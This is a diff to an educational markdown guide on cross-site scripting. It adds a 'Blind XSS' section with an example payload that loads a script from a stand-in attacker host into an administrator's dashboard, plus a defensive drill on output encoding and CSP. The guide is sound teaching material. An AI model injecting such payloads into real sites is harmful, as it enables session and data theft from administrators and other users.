@@ -16,10 +16,12 @@ Cross-site Scripting can be used to achieve a lot of things:
 * if that's not enough, you may find more ideas [here](http://www.xss-payloads.com/payloads.html).
 
 ## Types
-There are mainly three types of XSS:
+There are mainly four commonly discussed types of XSS:
+
 * Reflected XSS
 * Stored XSS
 * DOM XSS
+* Blind XSS
 
 ### Reflected XSS
 Reflected XSS or non-persistent is the simplest form of XSS and occurs when user input is immediately returned by the web application in the HTTP response.
@@ -110,7 +112,31 @@ A DOM Based XSS attack against this page can be accomplished by sending the foll
 
 `https://example.com/page.html?default=<script>alert(1)</script>`
 
+### Blind XSS
 
+Blind XSS is a type of Stored XSS where the malicious payload is executed in a different environment from where it was originally injected. Unlike regular Stored XSS, the attacker cannot immediately observe the execution of the payload. Instead, the payload is triggered later when another user, such as an administrator or support staff, views the stored content.
+
+#### Example
+
+Suppose a website contains a contact form where submitted messages are reviewed by administrators through an internal dashboard.
+
+An attacker submits the following payload:
+
+```html
+<script src="https://attacker.example/xss.js"></script>
+```
+
+The payload is stored safely in the database and is not executed immediately. Later, when an administrator opens the support dashboard, the browser executes the script, allowing the attacker to detect the execution or steal sensitive information.
+
+#### Further Reading
+
+* https://owasp.org/www-community/attacks/xss/
+* https://portswigger.net/web-security/cross-site-scripting/blind
+* https://owasp.org/www-project-web-security-testing-guide/
+
+#### Drill
+
+Create a simple web application where user feedback is stored in a database. Imagine that the feedback is later viewed by an administrator. Explain how a Blind XSS payload could execute in the administrator's browser and describe how proper output encoding and Content Security Policy (CSP) can prevent the attack.
 ## Note
 The three types of XSS presented above are the ones that historically speaking were categorised, but in order to do a categorization a criteria is needed. The types above have no criteria on which they are sepparated, so let's split XSS vulnerabilities by the place where data is used:
 * Server XSS
